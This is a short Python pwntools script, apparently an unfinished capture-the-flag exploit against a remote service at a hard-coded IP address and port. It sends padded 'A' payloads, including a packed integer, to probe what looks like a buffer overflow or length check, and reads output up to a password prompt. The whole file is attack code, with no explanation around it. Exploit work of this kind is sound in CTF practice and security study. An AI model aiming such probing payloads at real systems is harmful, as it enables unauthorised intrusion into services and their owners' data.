#!/usr/bin/env python

from pwn import *
import subprocess
import os


# p = process('./prob')
p = remote('125.131.189.33', 10102)

print p.recv()

p.send("A"*10 + p32(2) + "\n")

print p.recv()

p.send("A"*0x10 + "\n")

print p.recv()

p.send("Over size:[AAAAAAAAAAAAAAAA]"[:15] + "\n")

# print p.recvuntil('\n')
print p.recvuntil('[AAAA')
# raw_input('#')
print p.recvuntil('INPUT PASSWD:')
